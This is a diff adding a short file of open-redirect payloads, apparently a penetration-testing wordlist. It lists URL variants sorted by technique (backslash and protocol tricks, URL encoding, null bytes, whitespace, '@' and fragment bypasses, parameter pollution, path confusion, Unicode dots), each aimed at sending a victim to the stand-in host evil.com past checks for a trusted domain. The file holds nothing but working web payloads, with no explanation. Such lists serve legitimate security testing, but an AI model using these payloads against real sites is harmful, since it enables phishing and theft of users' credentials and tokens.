@@ -1,0 +1,54 @@
+# Open Redirect Payloads
+
+# Basic
+https://evil.com
+http://evil.com
+//evil.com
+
+# Backslash tricks
+/\evil.com
+\/evil.com
+\\evil.com
+\/\/evil.com
+
+# Protocol tricks
+https:evil.com
+https:/evil.com
+https://evil.com
+/https://evil.com
+
+# URL encoding
+https://evil.com%00
+https://evil.com%0d%0a
+https://evil%2ecom
+%2f%2fevil.com
+
+# @ bypass
+https://trusted.com@evil.com
+https://evil.com#trusted.com
+https://trusted.com.evil.com
+
+# Null byte
+https://trusted.com%00.evil.com
+https://trusted.com%00@evil.com
+
+# Whitespace
+https://trusted.com evil.com
+https://trusted.com%09evil.com
+https://trusted.com%0aevil.com
+https://trusted.com%0devil.com
+
+# Fragment
+https://evil.com#
+https://evil.com#trusted.com
+
+# Parameter pollution
+?url=https://evil.com&url=https://trusted.com
+
+# Path confusion
+https://trusted.com/https://evil.com
+https://evil.com/trusted.com
+
+# Unicode tricks
+https://trusted.com。evil.com
+https://trusted。com/evil
